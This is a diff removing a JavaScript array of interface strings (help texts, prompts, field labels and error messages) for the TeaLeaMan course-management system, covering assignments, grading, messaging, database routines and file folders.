@@ -1,1796 +1,1 @@
-var textmsg = [
-/*0*/"You may need to remove some quotation marks.",
-/*1*/"Do you want to delete this routine of data access and presentation?",
-/*2*/"Enter a new name:",
-/*3*/"exists.",
-/*4*/"exists. It is a system routine of data access and presentation.",
-/*5*/"Name: The name of the routine of data access and presentation. Names must be different from each other."+"\nTitle: The title of the routine of data access and presentation."+"\nFormat: The format used to present the data. It has the following possible values<table>"+"\n<tr><td valign=top>Form </td><td> displaying one record in a page with navigation buttons</td></tr>"+"\n<tr><td valign=top>Table</td><td>displaying all records in a table with one record in a row</td></tr>"+"\n<tr><td valign=top>HTMLTable </td><td> displaying all records in a HTML document with one record in a line. The data can not be edited</td></tr>"+"\n<tr><td valign=top>HTMLForm </td><td> displaying records in a HTML document with one record per page. The data can not be further edited</td></tr>"+"\n<tr><td valign=top>Text</td><td> displaying all records in  plain text with one record in a line. The data can not be further edited</td></tr>"+"\n<tr><td valign=top>LaTex</td><td> displaying all records in a LaTex table with one record in a row. The data can not be further edited</td></tr>"+"\n<tr><td valign=top>XML</td><td> displaying all records in a XML document. The data can not be further edited</td></tr>"+"\n<tr><td valign=top>Picker</td><td> Display a list of candidate records for user to choose one or more record</td></tr>"+"\n<tr><td valign=top>Search</td><td> Generate Search form for user to enter searching requirements</td></tr>"+"\n<tr><td valign=top>Update</td><td> Update data only, no data will be displayed</td></tr></table>"+"\nRoles to: Specification of roles of user who can execute this routine."+"\nQuery: This field is a SQL query for retrieving and  presenting data."+"\nInsert: This field contains queries for inserting a new record. They are separated by a ';'. Default values in the format of name=value may be followed."+"\nUpdate: This field contains queries for updating the dataset. They are separated by an empty line."+"\nDelete: The Delete query"+"\nTools: Processing Tools",
-/*6*/"Description of Form Fields",
-/*7*/"Instructions",
-/*8*/"Descriptions of Tool Buttons",
-/*9*/"Test the current routine",
-/*10*/"Displaying captions of the current routine",
-/*11*/"Save the modifications to the routine",
-/*12*/"Create a new routine or start a new search",
-/*13*/"Search routines that meet the  searching requirements",
-/*14*/"Delete the current routine",
-/*15*/"Name",
-/*16*/"Select",
-/*17*/"Help",
-/*18*/"Cancel",
-/*19*/"Foot",
-/*20*/"ago",
-/*21*/"DataOut",
-/*22*/"Query",
-/*23*/"Report",
-/*24*/"Reset",
-/*25*/"Session",
-/*26*/"LastName",
-/*27*/"FirstName",
-/*28*/"Score",
-/*29*/"Grade",
-/*30*/"Detail",
-/*31*/"Details",
-/*32*/"Detail: the aggregation details including raw scores and weights",
-/*33*/"aggregation Details",
-/*34*/"Grade Report",
-/*35*/"Instructor",
-/*36*/"Time",
-/*37*/"ID",
-/*38*/"Last Name",
-/*39*/"First Name",
-/*40*/"How to Use Grouping",
-/*41*/"Aggregation Details",
-/*42*/"Session",
-/*43*/"Others",
-/*44*/"Invalid threshold: higher grade has lower threshold:",
-/*45*/"Invalid numeric value: higher grade has lower numeric value:",
-/*46*/"NaN",
-/*47*/"standard deviation",
-/*48*/"About Standard Deviation",
-/*49*/"As a common statistic, standard deviation quantities the diversity of grades in this course",
-/*50*/"Description of Table Fields",
-/*51*/"Description of Function Buttons",
-/*52*/"The total weight of all groups is not 100%. Do you want to continue anyway?",
-/*53*/"The total weight of all assignments is not 100%. Do you want to continue anyway?",
-/*54*/"is not in any group. Do you want to continue?",
-/*55*/"Group",
-/*56*/"contains no item. Do you want to continue?",
-/*57*/"The number of groups is the same as the number of items. You don't have to use group in such case. Continue?",
-/*58*/"group",
-/*59*/"Group name",
-/*60*/"you entered is not in the group list. Do you want to create a new group named",
-/*61*/"Submit",
-/*62*/"You can not drop more than the total number of items in this group",
-/*63*/"Use Grouping",
-/*64*/"Grouping supports selective aggregation scheme. You may divide all assignment/test items into several groups and  drop some items in each group. For example, you may drop the lowest two items in the Quiz group. Don't use grouping if every item  counts.",
-/*65*/"Calculate the grades based on the determined scales and weights or group weights",
-/*66*/"Proceed",
-/*67*/"Save",
-/*68*/"Save the information about scales and weights or group weights",
-/*69*/"Delete",
-/*70*/"Delete a group",
-/*71*/"ClearOld",
-/*72*/"Clear the previously saved evaluation details.",
-/*73*/"How to Sort the Table",
-/*74*/"Click the heading of this field to sort the table by this field",
-/*75*/"Incorrect time format. Enter time in the format",
-/*76*/"tags don't match",
-/*77*/"Your message seems to be in",
-/*78*/"format, but you set the Format to be",
-/*79*/". Are you sure your Format setting?",
-/*80*/"Your message seems to be in",
-/*81*/" There is no message from students. You may compose a message",
-/*82*/"Click the Help button and read How to Edit an Assignment/test",
-/*83*/"PlainText",
-/*84*/"answer",
-/*85*/"assignment",
-/*86*/"Please wait while the server is processing your request.",
-/*87*/"Click Help Button to read The Formatting Rules for Making Multiple-choice Test",
-/*88*/"New users please click the \"Help\" button on this page to open the Help manu and read through it",
-/*89*/"There is no attachment",
-/*90*/"There is no error",
-/*91*/"Operation failed.",
-/*92*/"There is no new data",
-/*93*/"Incorrect format of transfer script",
-/*94*/"Invalid script",
-/*95*/"Name: The name of the assignment/test. You can use generic name such as Week1, quiz1, project1, but a meaningful name such as 'linear equation' is recommended"+"\nStart: When the assignment/test is available to students. It is critical for a test"+"\nDue: When the assignment/test is supposed to be handed in or submitted"+"\nFormat: The text format in which you edit the question and answer"+"\nType: Assignment, or multiple-choice, automatic-grading test, or online written test"+"\nSessions: By default, this will be the session you teach. But you also can share you assignment documents with other instructors by adding their sessions."+"\nGrader: By default, the grader will be the instructor and the assigned teaching assistants. But you can specified any user as an grader of this assignment."+"\nStatus: There are four statuses(Open, Close, Auto, Grading). 'Open' means that the system can accept submission for this assignment/test, 'Close' means that the system does not accept submission, 'Auto' lets the system to determine  'Open' or 'Close' based on the 'Due' date, i.e, 'Open' before the due and  'Close' after the due.'Grading' status disallows students to view grading information that are changing during grading in order to avoid misunstanding and argument"+"\nQuestion: The text of the assignment/test. The tool buttons can be used  to edit or process the text (See How to Edit Question below)"+"\nAnswer: The text of the answer of the assignment"+"\nOptions: More options for written test and multiple-choice test can be set.",
-/*96*/"The change has not been saved. Do you want to save it?",
-/*97*/"Enter a name",
-/*98*/" exists. Use another name.",
-/*99*/"does not exit",
-/*100*/"Your previous partial answers to this test have been restored",
-/*101*/"All are completed",
-/*102*/"To be completed",
-/*103*/"There is no primary key",
-/*104*/"Select a row to move",
-/*105*/"Enter a due date-time in the format:",
-/*106*/"The Due date-time is a past time. Ignore it?",
-/*107*/"Tealeaman",
-/*108*/"Create an Item",
-/*109*/"select a status",
-/*110*/"while expecting",
-/*111*/"No closing tags match",
-/*112*/"Syntax Error in HTML: Tags do  not match",
-/*113*/"The text can not be saved.",
-/*114*/"New",
-/*115*/"You need to highlight the URL",
-/*116*/"Attention: The note in this assignment submission was changed by the student to pass a message to you.",
-/*117*/"End of the list",
-/*118*/"Restore",
-/*119*/"SaveFor",
-/*120*/"Do you really want to change assignment name from",
-/*121*/"to",
-/*122*/"Do you really want to delete this assignment?",
-/*123*/"Invalid grade",
-/*124*/"TeaLeaMan",
-/*125*/"Do you really want to change course from",
-/*126*/"Assignment",
-/*127*/"exists already. Choose another assignment.",
-/*128*/"Field",
-/*129*/"is modified. Do you want to save it?",
-/*130*/"SaveAll",
-/*131*/"Offline",
-/*132*/"To see the new configuration of tool buttons, save  your current grading work and click the Select button to re-select the set.",
-/*133*/"Assign the ungraded submissions  a default grade or ungrade the current selection. Enter a number as a default grade or blank for ungrading:",
-/*134*/"is not a valid score",
-/*135*/"All submissions have been graded in the current set",
-/*136*/"None submission in the current selection has been graded.",
-/*137*/"The following update has not been saved to the database. You may save this SQL script to the local disk and execute it later after a connection is re-established. Execute it in Database Access routines.",
-/*138*/"TeaLeaMan: Grading Submitted Assignment/Test",
-/*139*/"Submitted",
-/*140*/"Before Due",
-/*141*/"Delay",
-/*142*/"Due",
-/*143*/"Notes",
-/*144*/"Answer",
-/*145*/"Photo",
-/*146*/"Click the photo to show or hide the student photo.",
-/*147*/"Editable numeric score of grade. Use any scale (full score). For five-grade scale, use 4, 3, 2, 1, 0 for grade letter A, B, C, D, F",
-/*148*/"Editable  course ID of this submission",
-/*149*/"Editable   name of the assignment of this submission",
-/*150*/"Non-editable  due date time of the assignment",
-/*151*/"When this answer was submitted",
-/*152*/"Course Id",
-/*153*/"Submitted&nbsp;at",
-/*154*/"Student",
-/*155*/"Non-editable name of student who submits this answer. Click it to invoke the student monitor",
-/*156*/"Format",
-/*157*/"Editable format of this submission",
-/*158*/"You can exchange notes, comments or complains with the student by using this field",
-/*159*/"The answer submitted by student",
-/*160*/"Description of Form Fields",
-/*161*/"How to Make Corrections or Comments",
-/*162*/"Never delete any character from answer text submitted by students. You can only add your corrections or comments. Start your corrections or comments with four slashes //// in each line so that they will be in an outstanding color when students review them",
-/*163*/"How to Save Quickly",
-/*164*/"After you enter a grade, hit the 'Return/Enter' key.",
-/*165*/"How to View the Student Information",
-/*166*/"Click the the student name.",
-/*167*/"How to Show and Hide the Student Photo",
-/*168*/"Click the the photo to switch between the showing and hiding mode.",
-/*169*/"Description of the Function Buttons",
-/*170*/"Data navigation button to display the first record in the data set",
-/*171*/"Display the previous record",
-/*172*/"Display the next record",
-/*173*/"Display the last  record",
-/*174*/"Save grade, notes and your corrections made to the submission.",
-/*175*/"Submit assignment/test on behalf of a student who, for some reason, submits answer using email attachments or disk.",
-/*176*/"Restore deleted submission record.",
-/*177*/"Delete the current submission record.",
-/*178*/"Question",
-/*179*/"Display the question  of the assignment/test.",
-/*180*/"Display the reference answer to the assignment/test. You can update the answer.",
-/*181*/"There are two usages of this mark field. You can use it to select records for deletion. The second usage is that the system use it to mark those records that are not successfully processed.",
-/*182*/"Mark",
-/*183*/"button",
-/*184*/"Default",
-/*185*/"Assign each of the current selection set of submissions a default grade, which is usually the most frequent grade",
-/*186*/"How to Configure the Tool Buttons",
-/*187*/"Tool buttons are associated with course.  Click the",
-/*188*/"Pick Tool",
-/*189*/"link",
-/*190*/"Then press the Tab key.",
-/*191*/"The Guide Says:",
-/*192*/"LaTex source is incorrect. No matching",
-/*193*/"was found in",
-/*194*/"Total",
-/*195*/"format, but you set the format to be",
-/*196*/"Do you want to change",
-/*197*/"If the message you are correcting was sent out a quite while ago, your students may have already read it. To avoid confusion, you may send your corrected message as a separate message instead. Do you want to do that?",
-/*198*/"You will need to change receiver, category or message text",
-/*199*/"Student Ids:The list of IDs of students who will receive this  message."+"\nMessage: The   message you are composing and sending to the students.",
-/*200*/"No answer is selected for Question",
-/*201*/"Do you want to submit anyway?",
-/*202*/"Please wait while the server is grading the test",
-/*203*/"Please wait while the server is processing your request",
-/*204*/"Do you really want to delete this submission?",
-/*205*/"The update will change the time stamp and may void your submission. Continue ?",
-/*206*/"Copy and paste your answers to the text area",
-/*207*/"Select Assignment",
-/*208*/"Receipt Number.",
-/*209*/"You are not done yet!"+"\nAfter you upload all files, you need to click the",
-/*210*/"Answer has been modified but not saved. Do you want to save the change?",
-/*211*/" has been modified but not saved. Do you want to save the change?",
-/*212*/"The page is going to be unloaded.",
-/*213*/"Content",
-/*214*/"View the question of the assignment",
-/*215*/"Description of Function Buttons",
-/*216*/"Resize sub-window by dragging the frame separator",
-/*217*/"Submit answers for the assignment/test",
-/*218*/"How to Submit Your Answers",
-/*219*/"Copy  your answer text and paste it here, and/or attach pre-formatted files or image files",
-/*220*/"Optionally process your answer text by clicking the function buttons",
-/*221*/"Click the submit bottom.",
-/*222*/"Help Tips",
-/*223*/"Send",
-/*224*/"Send a note  or complain  to the instructor",
-/*225*/"Update",
-/*226*/"Update the submitted answers",
-/*227*/"Delete the submitted answers.",
-/*228*/"Warning",
-/*229*/"Updating answer text  will cause the system to change the submission time stamp to the current time. Depending on your instructor's policy, this may void your submission.<br>But sending notes will not change  the time stamp.",
-/*230*/"Tip",
-/*231*/"Sending notes will not change the submission time stamp.",
-/*232*/"Send a note or complain to the instructor",
-/*233*/"View the reference answers to the assignment.",
-/*234*/"is closed and the system does not accept submission for this assignment/test. Ask your instructor for any question.",
-/*235*/"is closed and the system does not accept submission for this assignment/test."+"\nAsk your instructor for any question.",
-/*236*/"Pending",
-/*237*/"Commit",
-/*238*/"Create or modify the table structure in the database",
-/*239*/"Save the table definition, i.e, the query of creating table",
-/*240*/"Access",
-/*241*/"Generate or modify the tasks for data presentation and update to enter  data into the table or view  and modify  the data in the table",
-/*242*/"Please wait while the server is processing the request",
-/*243*/"No reference for Foreign key:",
-/*244*/"IsKey: If this field is part of the primary key"+"\nData provided by: a field in another table this field refers to",
-/*245*/"Invalid data in cell",
-/*246*/"Enter time in format",
-/*247*/"No row selected. Click the check box to select rows",
-/*248*/"How to Delete Records",
-/*249*/"Click the leftmost check box of each row that you want to delete, then click the",
-/*250*/"How to Sort the Records",
-/*251*/"Click the  heading  of the column of a field to sort the records by that field. Click again to sort reversely.",
-/*252*/"Do you really want to delete the selected records in the table?",
-/*253*/"The checked rows are not deleted because"+"\n1. The data is used in other table, or"+"\n2. Some other errors. Click the Debug in the dialog for details",
-/*254*/"The checked rows did not go through successfully because of invalid data entry (for example, mandatory fields are missing or key fields are duplicates). Click the Debug in the dialog for details",
-/*255*/"Do you really want to delete the table",
-/*256*/"How to Open a Folder or File",
-/*257*/"Click the name of the file or folder, or right-mouse click the file name to download and save the file",
-/*258*/"How to Move Files and Folders into Another Folder",
-/*259*/"Select the files and folders you want to move, then select 'MoveInto' from the operations of   target folder that you want to move items into. Note that the selected items can be carried into the next folder view",
-/*260*/"Click the  heading  of the column of a field to sort the records by that field.",
-/*261*/"How to Prevent a Folder from Being Browsed",
-/*262*/"First of all, please note that all files on your web site (not data in database) are readable by any web user if he/she knows the file path. However, if you put a file named index.html into a folder, then a web user can not list the folder and so h/she can not get a file in the folder unless h/she knows the file name",
-/*263*/"How to Upload a Folder",
-/*264*/"To upload a folder, say, C:\\\\folder, on your computer to the website, follow these steps",
-/*265*/"1. zip the folder to generate a folder.zip",
-/*266*/"Enter a field name or field label. It should be one or few words abstracting the field"+"\nEnter the field description, i.e, explanations of the field or instructions for user to fill out the field"+"\nSelect a format to see more explanations or just click 'Test' button to see what it looks like"+"\nCheck to indicate that the field is mandatory and must be filled out by user"+"\nEnter the title of this form, then press the Enter key",
-/*267*/"Enter the total number of digits for this numeric field"+"\nLeave it blank"+"\nEnter the typical number of characters this text box holds (The internal data capacity will be double as this)"+"\nEnter the typical number of characters in one line in the text block"+"\nLeave it blank or enter the typical number of characters in the select box(drop down menu)"+"\nLeave it blank"+"\n#"+"\nEnter the width of table in terms of pixels"+"\nLeave it blank or enter the typical length of a URL string (The Internal data capacity is 100)"+"\nEnter the width of the embedded window in terms of pixels"+"\nLeave it blank or enter the typical length of a URL string (The Internal data capacity is 100)"+"\nLeave it blank or Enter the typical length of a URL for the data picker routine (The Internal data capacity is 100)"+"\nEnter the typical number of characters hidden in this field (The internal data capacity will be double as this)"+"\nEnter the  number of decimals for this numeric field"+"\nLeave it blank"+"\n#"+"\nEnter the typical number of rows in this text block"+"\nLeave it blank"+"\n#"+"\n#"+"\nEnter the height of a table row in terms of pixels. The table rows will grow automatically"+"\nLeave it blank"+"\nEnter the height of the embedded window"+"\nLeave it blank"+"\n#"+"\n#"+"\nEnter a default or initial number in the specified format"+"\nEnter the default or initial time stamp in the format @ or use system current time, e.g, ??CURRENT_TIME??-3*24*3600 meaning three days later"+"\nEnter a default or initial text for this field. You may use ??CURRENT_USER?? or ??CURRENT_TIME?? inside"+"\nEnter a default or initial text for this field. You may use ??CURRENT_USER?? or ??CURRENT_TIME?? inside"+"\nList all choices and optional short codes in such a format: choice1,choice2;code1,code2. Let the initial selection go first. If there is no initial selection, put a blank space in the front of the list"+"\n#"+"\nEnter 1 if the check box should be checked initially"+"\nEnter short symbols such as \"3x5\" to indicate that the table should have 3 rows and 5 columns, or enter heading information such as |Heading1|,|Heading2|;||,||, which instructs the system to build an initial 2x2, but auto-growing-row  table"+"\nEnter \"http://\" to remind suggest user to enter a valid URL"+"\nEnter the complete URL of a web page to be embedded. User don't modify this field"+"\nEnter \"http://\" to remind user to enter a valid URL of an image"+"\nEnter \"http://\" to remind user to enter a valid URL pointing to a data picker routine"+"\nEnter a default value or initial value. Form filler can not see this value.",
-/*268*/"2. upload folder.zip to the website<br>",
-/*269*/"3. unzip folder.zip on website<br>",
-/*270*/"4. delete folder.zip from website",
-/*271*/"How to Download a Folder",
-/*272*/"Use the File Synchronizer to transfer file folders",
-/*273*/"The new password you entered was empty.",
-/*274*/"Your new password must be no greater than 32 characters.",
-/*275*/"Your new password must be at least 2 characters.",
-/*276*/"You did not re-type the same password",
-/*277*/"Please enter a valid password",
-/*278*/"Please re-enter the same the password",
-/*279*/"Please enter your last name",
-/*280*/"Please enter your first name",
-/*281*/"Please enter your department",
-/*282*/"Please enter your institution name",
-/*283*/"Please enter a city/town name",
-/*284*/"Please enter your email address",
-/*285*/"Self Defined",
-/*286*/"Please enter instructor ID",
-/*287*/"Please enter password",
-/*288*/"How to Edit the Question and Answer of Assignment/test",
-/*289*/"Enter a valid assignment/test name",
-/*290*/"newName",
-/*291*/"As the easiest way of editing assignment, in the Question box, write the question numbers on the text book, e.g, Problem 3.4-3.6 on page 210",
-/*292*/"Textbook's",
-/*293*/"Directly write text in the Question and Answer box. LaTex codes will be displayed directly",
-/*294*/"Upload",
-/*295*/"Use your favorite editor to make an assignment/test document and then upload it. Make sure your file format can be viewed on the computers your students use",
-/*296*/"Use your favorite HTML editor to compose a document and then copy-paste HTML source codes into the Question and Answer box, and set the Format to be HTML",
-/*297*/"Write on page and take a cellphone picture and upload it as an attachment",
-/*298*/"Hand Written",
-/*299*/"Oral",
-/*300*/"Only enter the name of the assignment, but leave Question area blank. Assign the question during the class orally. If the type of multiple choice short answer, TeaLeaMan still displays text boxes for students to enter their answers.",
-/*301*/"Description of the Function Buttons and Tool Buttons",
-/*302*/"Options",
-/*303*/"Set options of multiple-choice, automatic grading test",
-/*304*/"Save incomplete answers of assignment/test",
-/*305*/"Delete the current assignment/test",
-/*306*/"To configure the Tool Buttons, click",
-/*307*/"Pick Tools",
-/*308*/"Rules for Formatting  Assignment/test",
-/*309*/"Order questions numerically (1, 2, 3...)"+"\nOrder answer choices alphabetically (a, b, c, ...A, B, C...)"+"\nThe ordering numbers  and letters  are the leading characters of their lines"+"\nNon-ordering number or letter can not be the leading characters in their lines. Use space before any such characters."+"\nAnswer to a multiple-choice question has to be single letter that indicates  the  ordering label of the unique correct selective item, optionally followed by a separating punctutation character and a line to explain the answer."+"\nRule for making the filling-out-blank questions: use 3 or more consecutive underscores such as ______ to mark a blank in questions. Multiple blanks are allowed, but the answers have to be in separate lines"+"\nThere is no restriction on long-answer questions, except for formating syntax. To edit  rich format questions and answers, first use the LaTex tool to enter LaTex codes on the top, then in RichEdit move the LaTex codes to appropriate place",
-/*310*/"Insert",
-/*311*/"Just write <b>[Imagelet]</b> into text box at the position where you want to insert the imagelet<br>"+"\nor[Imagelet:1] to set image towards left<br>or[Imagelet:2] to set image towards right",
-/*312*/"or you may first move the cursor to the inserting position in the text box and then press this",
-/*313*/"grade",
-/*314*/"content",
-/*315*/"comment",
-/*316*/"course",
-/*317*/"Assignname",
-/*318*/"ReportTo",
-/*319*/"If you remove fields or change the field format, the original converted form will not work any more.",
-/*320*/"Pick Color",
-/*321*/"Interface",
-/*322*/"Issue Bills",
-/*323*/"Check Consistency",
-/*324*/"Receive Payments",
-/*325*/"Application for Admission",
-/*326*/"Menu Index Organizer",
-/*327*/"Copy",
-/*328*/"Overwrite",
-/*329*/"Tuition",
-/*330*/"Use alphabets and digits only",
-/*331*/"You have not selected courses to take. Continue?",
-/*332*/"How are you doing?",
-/*333*/"Message Exchange",
-/*334*/"Do you want to close the instant messaging?",
-/*335*/"Sending channel closed",
-/*336*/"Empty file name. Use Browse to find the file you want to send",
-/*337*/"Receiving  channel closed",
-/*338*/"The instant messaging page is being unloaded. Do you want to close the instant messaging?",
-/*339*/"The instant messaging page is being closed. Do you want to close the instant messaging?",
-/*340*/"Message: Message should be less than 1000 characters"+"\nFormat: If the format is not selected, TeaLeaMan will determine the format automatically.",
-/*341*/"How to Send Message",
-/*342*/"Send the message.",
-/*343*/"SendMsg",
-/*344*/"How to Receive Message",
-/*345*/"Click the",
-/*346*/"RecvMsg",
-/*347*/"Receive all messages that have already been sent by the other party.",
-/*348*/"Do you want to back up the selected table",
-/*349*/"Do you really want to",
-/*350*/" the current record",
-/*351*/"There is no record",
-/*352*/"Click a course title to make an announcement for that course",
-/*353*/"Changes in data will not lost.",
-/*354*/"User Account",
-/*355*/"Create Account",
-/*356*/"Account Information",
-/*357*/"Change  Password",
-/*358*/"Set Personal Preferences",
-/*359*/"Teaching Information",
-/*360*/"My Courses",
-/*361*/"Student Information",
-/*362*/"My Sessions",
-/*363*/"Teaching Resources",
-/*364*/"Communication Platform",
-/*365*/"Announcements",
-/*366*/"Instant Messaging",
-/*367*/"Database Administration",
-/*368*/"Table Definitions",
-/*369*/"Data Access Routines",
-/*370*/"Login Session",
-/*371*/"Logout",
-/*372*/"Session Info",
-/*373*/"Teaching Routines",
-/*374*/"Assignments & Tests",
-/*375*/"Grading",
-/*376*/"Records of Scores",
-/*377*/"Grade Aggregations",
-/*378*/"Database & Web Services",
-/*379*/"Web Services",
-/*380*/"Service Subscriptions",
-/*381*/"User Support",
-/*382*/"Overview of TeaLeaMan",
-/*383*/"Defects & Enhancements",
-/*384*/"TeaLeaMan Forum",
-/*385*/"For Students",
-/*386*/"Registration",
-/*387*/"For Administrator",
-/*388*/"Internal Emails",
-/*389*/"Login",
-/*390*/"System Configuration",
-/*391*/"User Accounts",
-/*392*/"Schedule Courses",
-/*393*/"h",
-/*394*/"m",
-/*395*/" Before Due",
-/*396*/" Delay",
-/*397*/"Not yet",
-/*398*/"Please save this receipt to your computer",
-/*399*/"The submission has been deleted",
-/*400*/"Feedback",
-/*401*/"Click a course title or an editing link",
-/*402*/"Web Forms",
-/*403*/"Discussion & Collaboration",
-/*404*/"Web File Management",
-/*405*/"Selecting Requirements",
-/*406*/"New",
-/*407*/"Customize",
-/*408*/"Preview",
-/*409*/"Print",
-/*410*/"Realtabl",
-/*411*/"View the real table that exists in the database",
-/*412*/"Refresh",
-/*413*/"Save the definition of query and routine",
-/*414*/"Options",
-/*415*/"Don't abort any test because the score has been initialized to zero on the server.",
-/*416*/"Don't move or minimize the window or your test will abort automatically.",
-/*417*/"You have not select ratting answer for question number",
-/*418*/"Name",
-/*419*/"Description",
-/*420*/"Category",
-/*421*/"Handler",
-/*422*/"Option",
-/*423*/"Button Color",
-/*424*/"Use It",
-/*425*/"Email Address",
-/*426*/"Course ID",
-/*427*/"Id",
-/*428*/"Major",
-/*429*/"Degree",
-/*430*/"Years",
-/*431*/"Credits",
-/*432*/"Accreditation",
-/*433*/"Director",
-/*434*/"Department",
-/*435*/"Capacity",
-/*436*/"More",
-/*437*/"Curriculum",
-/*438*/"Website",
-/*439*/"Notes",
-/*440*/"Major Minor",
-/*441*/"Title",
-/*442*/"Date Time",
-/*443*/"Format",
-/*444*/"Content",
-/*445*/"CURRENT",
-/*446*/"To Roles",
-/*447*/"To",
-/*448*/"Course",
-/*449*/"Message",
-/*450*/"Start",
-/*451*/"Due",
-/*452*/"Type",
-/*453*/"Sessions",
-/*454*/"Grader",
-/*455*/"Status",
-/*456*/"Question",
-/*457*/"Reference",
-/*458*/"Options",
-/*459*/"Sessionname",
-/*460*/"Mismatch",
-/*461*/"Discard",
-/*462*/"Commit",
-/*463*/"Score",
-/*464*/"Course",
-/*465*/"Num Submission",
-/*466*/"Course Id",
-/*467*/"Instructor",
-/*468*/"Textbook",
-/*469*/"Current",
-/*470*/"Credit",
-/*471*/"Session",
-/*472*/"Prerequisite",
-/*473*/"Eval Rule",
-/*474*/"Evaluation",
-/*475*/"Area",
-/*476*/"Objectives",
-/*477*/"Selective",
-/*478*/"Can Add",
-/*479*/"Schedule",
-/*480*/"Text Book",
-/*481*/"Current Active",
-/*482*/"Tool",
-/*483*/"for Student",
-/*484*/"Grading",
-/*485*/"Editing",
-/*486*/"course Title",
-/*487*/"Can Drop",
-/*488*/"Room",
-/*489*/"Seats",
-/*490*/"Staff",
-/*491*/"Syllabus",
-/*492*/"Grade",
-/*493*/"Equivalent",
-/*494*/"Time",
-/*495*/"Assistant",
-/*496*/"Allow Add",
-/*497*/"Allow Drop",
-/*498*/"Program Id",
-/*499*/"Group",
-/*500*/"Program",
-/*501*/"Pass Grade",
-/*502*/"Bitorder",
-/*503*/"Rolename",
-/*504*/"Owndb",
-/*505*/"Sign In Code",
-/*506*/"The System Administrator account has been registered. Now please login the system, in the System Administration function area, follow the order one by one to open the linked pages to perform the system configuration",
-/*507*/"Roles",
-/*508*/"Firstname",
-/*509*/"Middlename",
-/*510*/"Lastname",
-/*511*/"Address",
-/*512*/"City",
-/*513*/"State",
-/*514*/"Zip",
-/*515*/"Phone",
-/*516*/"Email",
-/*517*/"Photourl",
-/*518*/"User Id",
-/*519*/"Server URL",
-/*520*/"JDBCDriver",
-/*521*/"DBUserid",
-/*522*/"DBPassword",
-/*523*/"Server",
-/*524*/"Db Userid",
-/*525*/"College",
-/*526*/"Location",
-/*527*/"Telephone",
-/*528*/"Topic",
-/*529*/"Domain",
-/*530*/"Values",
-/*531*/"Value",
-/*532*/"Code",
-/*533*/"Page Name",
-/*534*/"Tools",
-/*535*/"Ratting",
-/*536*/"Comments On Instructor",
-/*537*/"Comments On Course",
-/*538*/"Comments On TA",
-/*539*/"TA",
-/*540*/"Instructor Id",
-/*541*/"Comments",
-/*542*/"Order",
-/*543*/"View",
-/*544*/"Selection Name",
-/*545*/"Event",
-/*546*/"Link",
-/*547*/"Rating Answer",
-/*548*/"AllowAdd",
-/*549*/"AllowDrop",
-/*550*/"EvaluationRule",
-/*551*/"Position",
-/*552*/"School",
-/*553*/"Contact",
-/*554*/"Office Hour",
-/*555*/"Profile",
-/*556*/"HireDate",
-/*557*/"Institution",
-/*558*/"Threshold",
-/*559*/"GPAValue",
-/*560*/"Counter",
-/*561*/"Percentage",
-/*562*/"Group Name",
-/*563*/"Num Of Items",
-/*564*/"Drop Top",
-/*565*/"Drop Bottom",
-/*566*/"Drop Bot",
-/*567*/"Hint",
-/*568*/"Number",
-/*569*/"Student",
-/*570*/"Sender Uid",
-/*571*/"Recipient",
-/*572*/"Post Time",
-/*573*/"Suppress",
-/*574*/"For Student",
-/*575*/"Sender Id",
-/*576*/"From",
-/*577*/"Detail",
-/*578*/"Direction",
-/*579*/"Sent Time",
-/*580*/"Recipient Id",
-/*581*/"Details",
-/*582*/"Roster",
-/*583*/"Absence",
-/*584*/"Photo Url",
-/*585*/"File Extension Name",
-/*586*/"Operation",
-/*587*/"Pass Question",
-/*588*/"Pass Answer",
-/*589*/"Middle Name",
-/*590*/"Schema",
-/*591*/"Instruction",
-/*592*/"User Link",
-/*593*/"Admin Link",
-/*594*/"Active",
-/*595*/"Session Name",
-/*596*/"Role Code",
-/*597*/"Absent Today",
-/*598*/"Total Absence",
-/*599*/"Slot Num",
-/*600*/"Classroom",
-/*601*/"Room Num",
-/*602*/"Session",
-/*603*/"Preference",
-/*604*/"Course Title",
-/*605*/"Non Concurrent",
-/*606*/"Load Limit",
-/*607*/"Actual Load",
-/*608*/"Utilization",
-/*609*/"Teaching Load",
-/*610*/"Add Session",
-/*611*/"Staffing",
-/*612*/"Load",
-/*613*/"Building",
-/*614*/"Room Number",
-/*615*/"Room Type",
-/*616*/"Preference",
-/*617*/"Class Room",
-/*618*/"Time Slot",
-/*619*/"Time Preference",
-/*620*/"Time Excluded",
-/*621*/"Hours",
-/*622*/"Instructor Average",
-/*623*/"Ta Average",
-/*624*/"Course Average",
-/*625*/"Grade Average",
-/*626*/"Instr Average",
-/*627*/"Service",
-/*628*/"Work Hours",
-/*629*/"SSN",
-/*630*/"Birthday",
-/*631*/"Major Program",
-/*632*/"Minor Program",
-/*633*/"Adviser",
-/*634*/"Balance",
-/*635*/"Monitor",
-/*636*/"Photo",
-/*637*/"Registration",
-/*638*/"Minor",
-/*639*/"Photo URL",
-/*640*/"Home City",
-/*641*/"Home State",
-/*642*/"Home Address",
-/*643*/"Home State",
-/*644*/"Home Zip",
-/*645*/"Home Phone",
-/*646*/"Item",
-/*647*/"Num Subms",
-/*648*/"Average",
-/*649*/"Highest",
-/*650*/"Caption",
-/*651*/"Meeting Time",
-/*652*/"Evaluations",
-/*653*/"Client Name",
-/*654*/"Current Semester",
-/*655*/"Is this the main file of the form?",
-/*656*/"You have not uploaded the main form file yet. Upload a html file to convert",
-/*657*/"All uploaded files will be deleted. Are you sure you want to cancel the form conversion process?",
-/*658*/"TBGCOLOR",
-/*659*/"Time Format",
-/*660*/"Grade System",
-/*661*/"Semester",
-/*662*/"Main Background",
-/*663*/"Menu Background",
-/*664*/"Tableline Color",
-/*665*/"Tablecell Color",
-/*666*/"Time Format",
-/*667*/"Test",
-/*668*/"IBSN",
-/*669*/"Edition",
-/*670*/"Author",
-/*671*/"Publisher",
-/*672*/"Price",
-/*673*/"Student Id",
-/*674*/"Institution",
-/*675*/"Web File Folder",
-/*676*/"Set Pass",
-/*677*/"New Password",
-/*678*/"Confirm It",
-/*679*/"Fid",
-/*680*/"Vendor Name",
-/*681*/"Fax",
-/*682*/"Vendor",
-/*683*/"Accreditation",
-/*684*/"Basic Entities",
-/*685*/"Academic Programs",
-/*686*/"Administration and Management",
-/*687*/"Evaluation and Assessments",
-/*688*/"System Configuration",
-/*689*/"Faculty",
-/*690*/"Students",
-/*691*/"Courses",
-/*692*/"Departments",
-/*693*/"Course Scheduling",
-/*694*/"User Databases",
-/*695*/"My Students",
-/*696*/"Domains and Values",
-/*697*/"System Services",
-/*698*/"Database Settings",
-/*699*/"File Folders",
